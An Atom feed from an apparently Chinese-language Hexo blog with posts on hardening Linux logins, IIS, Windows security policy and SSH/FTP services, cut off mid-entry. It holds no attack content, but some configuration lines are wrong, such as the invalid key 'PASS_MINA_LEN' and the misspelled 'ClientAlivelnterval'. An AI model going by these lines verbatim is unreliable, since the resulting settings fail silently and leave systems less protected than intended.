<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>時雨|Blog</title>
  
  <subtitle>有理想的人，生活总是火热的。 --斯大林</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2021-12-14T13:11:21.356Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>時雨</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Linux登录安全加固</title>
    <link href="http://example.com/2021/12/13/Linux%E7%99%BB%E5%BD%95%E5%8A%A0%E5%9B%BA/"/>
    <id>http://example.com/2021/12/13/Linux%E7%99%BB%E5%BD%95%E5%8A%A0%E5%9B%BA/</id>
    <published>2021-12-13T12:40:49.000Z</published>
    <updated>2021-12-14T13:11:21.356Z</updated>
    
    <content type="html"><![CDATA[<ol><li>        <h2 id="密码策略"   >          <a href="#密码策略" class="heading-link"><i class="fas fa-link"></i></a><a href="#密码策略" class="headerlink" title="密码策略"></a>密码策略</h2>      <ul><li>        <h3 id="修改-etc-login-defs-文件"   >          <a href="#修改-etc-login-defs-文件" class="heading-link"><i class="fas fa-link"></i></a><a href="#修改-etc-login-defs-文件" class="headerlink" title="修改 /etc/login.defs 文件"></a>修改 /etc/login.defs 文件</h3>      <figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/login.defs</span><br></pre></td></tr></table></div></figure><figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PASS_MAX_DAYS 90 <span class="comment">#密码最长过期天数</span></span><br><span class="line">PASS_MIN_DAYS 80 <span class="comment">#密码最小过期天数</span></span><br><span class="line">PASS_MINA_LEN 10 <span class="comment">#密码最小长度</span></span><br><span class="line">PASS_WARN_AGE 7 <span class="comment">#密码过期警告天数</span></span><br></pre></td></tr></table></div></figure><p><img src="/images/Linuxdl1.png" alt="1639466025737"></p><span id="more"></span></li><li>        <h3 id="修改-etc-pam-d-system-auth文件"   >          <a href="#修改-etc-pam-d-system-auth文件" class="heading-link"><i class="fas fa-link"></i></a><a href="#修改-etc-pam-d-system-auth文件" class="headerlink" title="修改/etc/pam.d/system-auth文件"></a>修改/etc/pam.d/system-auth文件</h3>      <figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/pam.d/system-auth</span><br></pre></td></tr></table></div></figure><p>在 password requisite pam_cracklib.so 一行换成如下内容：</p><figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">password requisite pam_cracklib.so retry=5 difok=3 minlen=10 ucredit=-1 lcredit=-3 dcredit=-3 dictpath=/usr/share/cracklib/pw_dict</span><br><span class="line"> <span class="comment">#参数含义</span></span><br><span class="line"><span class="comment">#retry:尝试次数5 | difok：最少不同字符：3 | minlen:最小密码长度10 </span></span><br><span class="line"> <span class="comment">#ucredit:最少大写字母1 | lcredit:最少小写字母3 | dcredit:最少数字3</span></span><br><span class="line"><span class="comment">#字典位置: /usr/share/cracklib/pw_dict</span></span><br></pre></td></tr></table></div></figure><p><img src="/images/Linuxdl2.png" alt="1639466628363"></p></li><li>        <h3 id="直接在控制台修改"   >          <a href="#直接在控制台修改" class="heading-link"><i class="fas fa-link"></i></a><a href="#直接在控制台修改" class="headerlink" title="直接在控制台修改"></a>直接在控制台修改</h3>      <figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#最小密码长度不少于8个字符</span></span><br><span class="line">authconfig --passminlen=8 --update</span><br><span class="line"><span class="comment">#密码中至少包含一个大写字母</span></span><br><span class="line">authconfig --enablerequpper --update</span><br><span class="line"><span class="comment">#密码中至少包含一个小写字母</span></span><br><span class="line">authconfig --enablereqlower --update</span><br><span class="line"><span class="comment">#密码中至少包含一个特殊字符</span></span><br><span class="line">authconfig --enablereqother --update</span><br><span class="line"><span class="comment">#密码中至少包含一个数字</span></span><br><span class="line">authconfig --enablereqdigit --update</span><br></pre></td></tr></table></div></figure><p><img src="/images/Linuxdl3.png" alt="1639466748116"></p></li></ul></li><li>        <h2 id="登录策略"   >          <a href="#登录策略" class="heading-link"><i class="fas fa-link"></i></a><a href="#登录策略" class="headerlink" title="登录策略"></a>登录策略</h2>      <ul><li>        <h3 id="在用户据登录系统是，应该有-“For-authorized-user-only”-提示信息"   >          <a href="#在用户据登录系统是，应该有-“For-authorized-user-only”-提示信息" class="heading-link"><i class="fas fa-link"></i></a><a href="#在用户据登录系统是，应该有-“For-authorized-user-only”-提示信息" class="headerlink" title="在用户据登录系统是，应该有 “For authorized user only” 提示信息"></a>在用户据登录系统是，应该有 “For authorized user only” 提示信息</h3>      <p>修改 /etc/issue 文件</p><figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/issue</span><br></pre></td></tr></table></div></figure><p>在文件尾部增加一行 For authorized user only</p><p><img src="/images/Linuxdl4.png" alt="1639467078335"></p><p>完成后，再本地登录时就会实现登录提示</p><p><img src="/images/Linuxdl5.png" alt="1639467126124"></p><p>只是这样修改的话在 ssh 连接时是不会有提示信息的，需要修改 ssh 配置文本</p><figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/ssh/sshd_config</span><br></pre></td></tr></table></div></figure><p>查找Banner，在下方添加一行 Banner /etc/ssh/banner</p><p>然后自己创建一个Banner文件 touch /etc/ssh/banner</p><p><img src="/images/Linuxdl6.png" alt="1639467372068"></p><p><img src="/images/Linuxdl7.png" alt="1639467449420"></p><p>在文件内添加需要提示的提示信息，完成后集团的重启 SSH 服务</p><figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart sshd</span><br></pre></td></tr></table></div></figure><p>使用效果</p><p><img src="/images/Linuxdl8.png" alt="1639482122485"></p></li><li>        <h3 id="一分钟内仅允许5次登录失败的尝试，超过5次，登录账号锁定1分钟"   >          <a href="#一分钟内仅允许5次登录失败的尝试，超过5次，登录账号锁定1分钟" class="heading-link"><i class="fas fa-link"></i></a><a href="#一分钟内仅允许5次登录失败的尝试，超过5次，登录账号锁定1分钟" class="headerlink" title="一分钟内仅允许5次登录失败的尝试，超过5次，登录账号锁定1分钟"></a>一分钟内仅允许<strong>5次</strong>登录失败的尝试，超过5次，登录账号锁定<strong>1分钟</strong></h3>      <p>修改 /etc/pam.d/system-auth 文件</p><figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/pam.d/login</span><br></pre></td></tr></table></div></figure><p>在第一行 %PAM-1.0 下方添加一行</p><figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auth required pam_tally2.so onerr=fail deny=5 unlock_time=60 even_deny_root root_unlock_time=60</span><br></pre></td></tr></table></div></figure><p>账户登录连续5次失败，锁定该账户60秒，60秒后可再次尝试登录，解锁后的第一次登录如果还是登录失败会再次锁定。在锁定期间输入的密码无论对错，都会被判定为错误密码。</p><p><img src="/images/Linuxdl9.png" alt="1639482295332"></p><p>上述操作仅适用于服务器终端，想要使ssh生效，则需要修改 <strong>/etc/pam.d/sshd</strong> 和 <strong>/etc/pam.d/login</strong></p><p>修改方法和上面一致，在首行下面新增一行</p></li><li>        <h3 id="远程用户非活动会话连接超时应小于等于五分钟"   >          <a href="#远程用户非活动会话连接超时应小于等于五分钟" class="heading-link"><i class="fas fa-link"></i></a><a href="#远程用户非活动会话连接超时应小于等于五分钟" class="headerlink" title="远程用户非活动会话连接超时应小于等于五分钟"></a>远程用户非活动会话连接超时应小于等于五分钟</h3>      <p>修改 <strong>/etc/ssh/sshd_config</strong> 文件</p><figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/ssh/sshd_config</span><br></pre></td></tr></table></div></figure><p>分别修改 <strong>ClientAlivelnterval</strong> 和 <strong>ClientAliveCountMax</strong> 的值为<strong>300</strong>，<strong>0</strong>，去掉注释</p><p><img src="/images/Linuxdl10.png" alt="1639482943527"></p></li></ul></li></ol>]]></content>
    
    
    <summary type="html">&lt;ol&gt;
&lt;li&gt;
        &lt;h2 id=&quot;密码策略&quot;   &gt;
          &lt;a href=&quot;#密码策略&quot; class=&quot;heading-link&quot;&gt;&lt;i class=&quot;fas fa-link&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;a href=&quot;#密码策略&quot; class=&quot;headerlink&quot; title=&quot;密码策略&quot;&gt;&lt;/a&gt;密码策略&lt;/h2&gt;
      &lt;ul&gt;
&lt;li&gt;
        &lt;h3 id=&quot;修改-etc-login-defs-文件&quot;   &gt;
          &lt;a href=&quot;#修改-etc-login-defs-文件&quot; class=&quot;heading-link&quot;&gt;&lt;i class=&quot;fas fa-link&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;a href=&quot;#修改-etc-login-defs-文件&quot; class=&quot;headerlink&quot; title=&quot;修改 /etc/login.defs 文件&quot;&gt;&lt;/a&gt;修改 /etc/login.defs 文件&lt;/h3&gt;
      &lt;figure class=&quot;highlight bash&quot;&gt;&lt;div class=&quot;table-container&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;vim /etc/login.defs&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;

&lt;figure class=&quot;highlight bash&quot;&gt;&lt;div class=&quot;table-container&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;PASS_MAX_DAYS 90 &lt;span class=&quot;comment&quot;&gt;#密码最长过期天数&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;PASS_MIN_DAYS 80 &lt;span class=&quot;comment&quot;&gt;#密码最小过期天数&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;PASS_MINA_LEN 10 &lt;span class=&quot;comment&quot;&gt;#密码最小长度&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;PASS_WARN_AGE 7 &lt;span class=&quot;comment&quot;&gt;#密码过期警告天数&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;/images/Linuxdl1.png&quot; alt=&quot;1639466025737&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Linux安全加固" scheme="http://example.com/categories/Linux%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/"/>
    
    
    <category term="安全加固" scheme="http://example.com/tags/%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/"/>
    
  </entry>
  
  <entry>
    <title>Web安全加固（Windows）</title>
    <link href="http://example.com/2021/12/13/Web%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA%EF%BC%88Windows%EF%BC%89/"/>
    <id>http://example.com/2021/12/13/Web%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA%EF%BC%88Windows%EF%BC%89/</id>
    <published>2021-12-13T03:03:56.000Z</published>
    <updated>2021-12-14T00:31:13.254Z</updated>
    
    <content type="html"><![CDATA[<ol><li>        <h3 id="为了防止web中-mdb数据库文件非法下载请对Web配置文件进行安全加固"   >          <a href="#为了防止web中-mdb数据库文件非法下载请对Web配置文件进行安全加固" class="heading-link"><i class="fas fa-link"></i></a><a href="#为了防止web中-mdb数据库文件非法下载请对Web配置文件进行安全加固" class="headerlink" title="为了防止web中.mdb数据库文件非法下载请对Web配置文件进行安全加固"></a>为了防止web中.mdb数据库文件非法下载请对Web配置文件进行安全加固</h3>      <p>管理工具 &gt; IIS管理器 &gt; 网站 &gt; Default Web Site &gt; 请求筛选 &gt; 右键文件扩展名 &gt; 拒绝文件扩展名，添加扩展名.mdb</p><p><img src="/images/winweb1.png" alt="1639366023569"></p><span id="more"></span></li><li>        <h3 id="限制目录执行权限，对picture-和-upload-目录是指执行权限为无"   >          <a href="#限制目录执行权限，对picture-和-upload-目录是指执行权限为无" class="heading-link"><i class="fas fa-link"></i></a><a href="#限制目录执行权限，对picture-和-upload-目录是指执行权限为无" class="headerlink" title="限制目录执行权限，对picture 和 upload 目录是指执行权限为无"></a>限制目录执行权限，对picture 和 upload 目录是指执行权限为无</h3>      <p>管理工具 &gt; IIS管理器 &gt; 网站 &gt; web &gt; picture/upload &gt; 梳理程序映射，右键空白处 &gt; 编辑功能权限，取消勾选<strong>执行</strong><img src="/images/winweb2.png" alt="1639366231464"></p></li><li>        <h3 id="开启IIS的日志审计记录-日志文件保存格式为W3C-只记录日期、时间、客户IP地址、用户名、方法"   >          <a href="#开启IIS的日志审计记录-日志文件保存格式为W3C-只记录日期、时间、客户IP地址、用户名、方法" class="heading-link"><i class="fas fa-link"></i></a><a href="#开启IIS的日志审计记录-日志文件保存格式为W3C-只记录日期、时间、客户IP地址、用户名、方法" class="headerlink" title="开启IIS的日志审计记录(日志文件保存格式为W3C,只记录日期、时间、客户IP地址、用户名、方法)"></a>开启IIS的日志审计记录(日志文件保存格式为W3C,只记录日期、时间、客户IP地址、用户名、方法)</h3>      <p>管理工具 &gt; IIS管理器 &gt; 网站 &gt; web &gt; 日志，格式选择W3C，点击选择字段，只勾选日期、时间、客户端IP地址、用户名、方法</p><p><img src="/images/winweb3.png" alt="1639366410834"></p><p><img src="/images/winweb4.png" alt="1639366448096"></p></li><li>        <h3 id="为了减轻网站负载，设置网站最大并发连接数为1000"   >          <a href="#为了减轻网站负载，设置网站最大并发连接数为1000" class="heading-link"><i class="fas fa-link"></i></a><a href="#为了减轻网站负载，设置网站最大并发连接数为1000" class="headerlink" title="为了减轻网站负载，设置网站最大并发连接数为1000"></a>为了减轻网站负载，设置网站最大并发连接数为1000</h3>      <p>管理工具 &gt; IIS管理器 &gt; 网站 &gt; 右侧-这是网站默认设置，设置限制连接数值为 <strong>1000</strong></p><p><img src="/images/winweb5.png" alt="1639366495206"></p></li><li>        <h3 id="防止文件枚举漏洞枚举网络服务器根目录文件，禁止IIS短文件名泄露"   >          <a href="#防止文件枚举漏洞枚举网络服务器根目录文件，禁止IIS短文件名泄露" class="heading-link"><i class="fas fa-link"></i></a><a href="#防止文件枚举漏洞枚举网络服务器根目录文件，禁止IIS短文件名泄露" class="headerlink" title="防止文件枚举漏洞枚举网络服务器根目录文件，禁止IIS短文件名泄露"></a>防止文件枚举漏洞枚举网络服务器根目录文件，禁止IIS短文件名泄露</h3>      <p>CMD 执行命令 fsutil behavior set disable8dot3 1</p><p><img src="/images/winweb6.png" alt="1639366549705"></p></li><li>        <h3 id="关闭IIS的WebDAV功能增强网站的安全性"   >          <a href="#关闭IIS的WebDAV功能增强网站的安全性" class="heading-link"><i class="fas fa-link"></i></a><a href="#关闭IIS的WebDAV功能增强网站的安全性" class="headerlink" title="关闭IIS的WebDAV功能增强网站的安全性"></a>关闭IIS的WebDAV功能增强网站的安全性</h3>      <p>管理工具 &gt; IIS管理器 &gt;主机名(WIN-242GA01GJ9K) &gt; ISAPI 和 CGI 限制，右键WebDav，点击拒绝</p><p><img src="/images/winweb7.png" alt="1639366616275"></p></li></ol>]]></content>
    
    
    <summary type="html">&lt;ol&gt;
&lt;li&gt;
        &lt;h3 id=&quot;为了防止web中-mdb数据库文件非法下载请对Web配置文件进行安全加固&quot;   &gt;
          &lt;a href=&quot;#为了防止web中-mdb数据库文件非法下载请对Web配置文件进行安全加固&quot; class=&quot;heading-link&quot;&gt;&lt;i class=&quot;fas fa-link&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;a href=&quot;#为了防止web中-mdb数据库文件非法下载请对Web配置文件进行安全加固&quot; class=&quot;headerlink&quot; title=&quot;为了防止web中.mdb数据库文件非法下载请对Web配置文件进行安全加固&quot;&gt;&lt;/a&gt;为了防止web中.mdb数据库文件非法下载请对Web配置文件进行安全加固&lt;/h3&gt;
      &lt;p&gt;管理工具 &amp;gt; IIS管理器 &amp;gt; 网站 &amp;gt; Default Web Site &amp;gt; 请求筛选 &amp;gt; 右键文件扩展名 &amp;gt; 拒绝文件扩展名，添加扩展名.mdb&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/winweb1.png&quot; alt=&quot;1639366023569&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Windows安全加固" scheme="http://example.com/categories/Windows%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/"/>
    
    
    <category term="安全加固" scheme="http://example.com/tags/%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/"/>
    
  </entry>
  
  <entry>
    <title>登录安全加固（Windows）</title>
    <link href="http://example.com/2021/12/11/%E7%99%BB%E5%BD%95%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA(Win)/"/>
    <id>http://example.com/2021/12/11/%E7%99%BB%E5%BD%95%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA(Win)/</id>
    <published>2021-12-11T06:55:19.000Z</published>
    <updated>2021-12-14T01:04:30.514Z</updated>
    
    <content type="html"><![CDATA[<ol><li>        <h2 id="密码策略"   >          <a href="#密码策略" class="heading-link"><i class="fas fa-link"></i></a><a href="#密码策略" class="headerlink" title="密码策略"></a>密码策略</h2>      <ul><li>        <h3 id="最小密码长度不少于8个字符"   >          <a href="#最小密码长度不少于8个字符" class="heading-link"><i class="fas fa-link"></i></a><a href="#最小密码长度不少于8个字符" class="headerlink" title="最小密码长度不少于8个字符"></a>最小密码长度不少于8个字符</h3>      <p>管理工具 &gt; 本地安全策略 &gt; 账户策略 &gt; 密码策略 ，<strong>设置密码长度最小值</strong>为8</p><p><img src="/images/winaq1.png" alt="1639358336424"></p><span id="more"></span></li><li>        <h3 id="密码策略必须同时满足大小写字母、数字、特殊字符"   >          <a href="#密码策略必须同时满足大小写字母、数字、特殊字符" class="heading-link"><i class="fas fa-link"></i></a><a href="#密码策略必须同时满足大小写字母、数字、特殊字符" class="headerlink" title="密码策略必须同时满足大小写字母、数字、特殊字符"></a>密码策略必须同时满足大小写字母、数字、特殊字符</h3>      <p>管理工具 &gt; 本地安全策略 &gt; 账户策略 &gt; 密码策略，启用<strong>密码必须符合复杂性要求</strong></p><p><img src="/images/winaq2.png" alt="1639358388277"></p></li></ul></li><li>        <h2 id="登陆策略"   >          <a href="#登陆策略" class="heading-link"><i class="fas fa-link"></i></a><a href="#登陆策略" class="headerlink" title="登陆策略"></a>登陆策略</h2>      <ul><li>        <h3 id="在用户登录系统时，应该有-“For-authorized-users-only”-提示信息"   >          <a href="#在用户登录系统时，应该有-“For-authorized-users-only”-提示信息" class="heading-link"><i class="fas fa-link"></i></a><a href="#在用户登录系统时，应该有-“For-authorized-users-only”-提示信息" class="headerlink" title="在用户登录系统时，应该有 “For authorized users only” 提示信息"></a>在用户登录系统时，应该有 “For authorized users only” 提示信息</h3>      <p>管理工具 &gt; 本地安全策略 &gt; 本地策略 &gt; 安全选项，找到 <strong>交互式登录：试图登录的用户的用户的消息文本</strong>，修改值为 <strong>For authorized users only</strong> </p><p><img src="/images/winaq3.png" alt="1639358499237"></p></li><li>        <h3 id="一分钟内仅允许5次登录失败的尝试，超过5次，登录账号锁定1分钟"   >          <a href="#一分钟内仅允许5次登录失败的尝试，超过5次，登录账号锁定1分钟" class="heading-link"><i class="fas fa-link"></i></a><a href="#一分钟内仅允许5次登录失败的尝试，超过5次，登录账号锁定1分钟" class="headerlink" title="一分钟内仅允许5次登录失败的尝试，超过5次，登录账号锁定1分钟"></a>一分钟内仅允许5次登录失败的尝试，超过5次，登录账号锁定1分钟</h3>      <p>管理工具 &gt; 本地安全策略 &gt; 账户策略 &gt; 账户锁定策略，分别设置 <strong>账户锁定时间</strong>，<strong>账号锁定阈值</strong>，<strong>重置账户锁定计数器为1分钟</strong>，<strong>6次无效登录</strong>，<strong>1分钟之后</strong></p><p>​    <strong>（注意，这里锁定阈值应为6次，截图中若为5次或其他则错误。）</strong></p><p><img src="/images/winaq4.png" alt="1639358555972"></p></li><li>        <h3 id="远程用户非活动会话连接超时应小于等于5分钟"   >          <a href="#远程用户非活动会话连接超时应小于等于5分钟" class="heading-link"><i class="fas fa-link"></i></a><a href="#远程用户非活动会话连接超时应小于等于5分钟" class="headerlink" title="远程用户非活动会话连接超时应小于等于5分钟"></a>远程用户非活动会话连接超时应小于等于5分钟</h3>      <p>运行 &gt; gpedit.msc &gt; 计算机配置 &gt; 管理模板 &gt; Windows组件 &gt; 远程桌面服务 &gt; 远程桌面会话主机 &gt; 会话时间限制，启用 <strong>设置获得但空闲的远程桌面服务会话的时间限制</strong>，设置空闲会话限制为<strong>5分钟</strong></p><p><img src="/images/winaq5.png" alt="1639358681574"></p></li></ul></li><li>        <h2 id="用户安全管理"   >          <a href="#用户安全管理" class="heading-link"><i class="fas fa-link"></i></a><a href="#用户安全管理" class="headerlink" title="用户安全管理"></a>用户安全管理</h2>      <ul><li>        <h3 id="对服务器进行远程管理安全性SSL加固，防止敏感信息泄露被监听"   >          <a href="#对服务器进行远程管理安全性SSL加固，防止敏感信息泄露被监听" class="heading-link"><i class="fas fa-link"></i></a><a href="#对服务器进行远程管理安全性SSL加固，防止敏感信息泄露被监听" class="headerlink" title="对服务器进行远程管理安全性SSL加固，防止敏感信息泄露被监听"></a>对服务器进行远程管理安全性SSL加固，防止敏感信息泄露被监听</h3>      <p>运行 &gt; gpedit.msc &gt; 计算机配置 &gt; 管理模板 &gt; Windows组件 &gt; 远程桌面服务 &gt; 远程桌面会话主机 &gt; 安全，启用<strong>设置客户端连接加密级别</strong>、<strong>要求安全的RPC通信</strong>、<strong>远程（RDP）连接要求使用指定的安全层</strong>，设置<strong>设置客户端连接加密级别的加密级别</strong>为 <strong>高级别</strong>、<strong>远程（RDP) 连接要求使用执行的安全层</strong> 的安全层为 <strong>SSL(TLS1.0)</strong><img src="/images/winaq6.png" alt="1639358836565"></p><p><img src="/images/winaq7.png" alt="1639358861643"></p><p><img src="/images/winaq8.png" alt="1639358889587"></p></li><li>        <h3 id="查找并删除服务器中可能存在的账号hacker"   >          <a href="#查找并删除服务器中可能存在的账号hacker" class="heading-link"><i class="fas fa-link"></i></a><a href="#查找并删除服务器中可能存在的账号hacker" class="headerlink" title="查找并删除服务器中可能存在的账号hacker"></a>查找并删除服务器中可能存在的账号hacker</h3>      <p>cmd执行 <strong>net user</strong> 查看全部用户</p><p>cmd执行 <strong>net user hacker  /del</strong> 删除账号hacker</p><p><img src="/images/winaq9.png" alt="1639359274045"></p></li><li>        <h3 id="普通用户进行最小权限管理，对关闭系统仅限管理员账号"   >          <a href="#普通用户进行最小权限管理，对关闭系统仅限管理员账号" class="heading-link"><i class="fas fa-link"></i></a><a href="#普通用户进行最小权限管理，对关闭系统仅限管理员账号" class="headerlink" title="普通用户进行最小权限管理，对关闭系统仅限管理员账号"></a>普通用户进行最小权限管理，对关闭系统仅限管理员账号</h3>      <p>管理工具 &gt; 本地安全策略 &gt; 本地策略 &gt; 用户权限分配，删除 关闭系统 中除 Administrators 外所有组</p><p><img src="/images/winaq10.png" alt="1639359351314"></p></li></ul></li></ol>]]></content>
    
    
    <summary type="html">&lt;ol&gt;
&lt;li&gt;
        &lt;h2 id=&quot;密码策略&quot;   &gt;
          &lt;a href=&quot;#密码策略&quot; class=&quot;heading-link&quot;&gt;&lt;i class=&quot;fas fa-link&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;a href=&quot;#密码策略&quot; class=&quot;headerlink&quot; title=&quot;密码策略&quot;&gt;&lt;/a&gt;密码策略&lt;/h2&gt;
      &lt;ul&gt;
&lt;li&gt;
        &lt;h3 id=&quot;最小密码长度不少于8个字符&quot;   &gt;
          &lt;a href=&quot;#最小密码长度不少于8个字符&quot; class=&quot;heading-link&quot;&gt;&lt;i class=&quot;fas fa-link&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;a href=&quot;#最小密码长度不少于8个字符&quot; class=&quot;headerlink&quot; title=&quot;最小密码长度不少于8个字符&quot;&gt;&lt;/a&gt;最小密码长度不少于8个字符&lt;/h3&gt;
      &lt;p&gt;管理工具 &amp;gt; 本地安全策略 &amp;gt; 账户策略 &amp;gt; 密码策略 ，&lt;strong&gt;设置密码长度最小值&lt;/strong&gt;为8&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/winaq1.png&quot; alt=&quot;1639358336424&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Windows安全加固" scheme="http://example.com/categories/Windows%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/"/>
    
    
    <category term="安全加固" scheme="http://example.com/tags/%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/"/>
    
  </entry>
  
  <entry>
    <title>服务加固与防火墙策略</title>
    <link href="http://example.com/2021/12/10/%E6%9C%8D%E5%8A%A1%E5%8A%A0%E5%9B%BA%E4%B8%8E%E9%98%B2%E7%81%AB%E5%A2%99%E9%85%8D%E7%BD%AE/"/>
    <id>http://example.com/2021/12/10/%E6%9C%8D%E5%8A%A1%E5%8A%A0%E5%9B%BA%E4%B8%8E%E9%98%B2%E7%81%AB%E5%A2%99%E9%85%8D%E7%BD%AE/</id>
    <published>2021-12-10T02:31:44.000Z</published>
    <updated>2021-12-14T00:30:59.461Z</updated>
    
    <content type="html"><![CDATA[        <h2 id="服务加固"   >          <a href="#服务加固" class="heading-link"><i class="fas fa-link"></i></a><a href="#服务加固" class="headerlink" title="服务加固"></a>服务加固</h2>      <ol><li>        <h3 id="为了防止密码再登录或者传输信息中被窃取仅使用证书登录SSH"   >          <a href="#为了防止密码再登录或者传输信息中被窃取仅使用证书登录SSH" class="heading-link"><i class="fas fa-link"></i></a><a href="#为了防止密码再登录或者传输信息中被窃取仅使用证书登录SSH" class="headerlink" title="为了防止密码再登录或者传输信息中被窃取仅使用证书登录SSH"></a>为了防止密码再登录或者传输信息中被窃取仅使用证书登录SSH</h3>      <p>修改ssh服务配置文件，</p><figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/ssh/sshd_config</span><br></pre></td></tr></table></div></figure><p>取消 PubkeyAuthentication 注释（如适用），将值改为yes，并将 PasswordAuthentication 的值改为no</p><p><img src="/images/2/1639104393412.png" alt="1639104393412"></p><p><img src="/images/2/1639104432169.png" alt="1639104432169"></p><p>然后重启ssh服务</p><figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart sshd</span><br></pre></td></tr></table></div></figure><span id="more"></span></li><li>        <h3 id="修改ssh服务端口为2222；"   >          <a href="#修改ssh服务端口为2222；" class="heading-link"><i class="fas fa-link"></i></a><a href="#修改ssh服务端口为2222；" class="headerlink" title="修改ssh服务端口为2222；"></a>修改ssh服务端口为2222；</h3>      <p>修改ssh服务配置文件，</p><figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/ssh/sshd_config</span><br></pre></td></tr></table></div></figure><p>查找 Port, 将注释取消，并将Port的值22改为2222，并重启服务.</p><p><img src="/images/2/1639104662705.png" alt="1639104662705"></p></li><li>        <h3 id="ssh禁止Root用户远程登录；"   >          <a href="#ssh禁止Root用户远程登录；" class="heading-link"><i class="fas fa-link"></i></a><a href="#ssh禁止Root用户远程登录；" class="headerlink" title="ssh禁止Root用户远程登录；"></a>ssh禁止Root用户远程登录；</h3>      <p>修改ssh服务配置文件，</p><figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/ssh/sshd_config</span><br></pre></td></tr></table></div></figure><p>查找 PermitRootLogin, 修改值为no，并重启ssh服务</p><p><img src="/images/2/1639105057869.png" alt="1639105057869"></p></li><li>        <h3 id="vsFTPd禁止匿名用户上传；"   >          <a href="#vsFTPd禁止匿名用户上传；" class="heading-link"><i 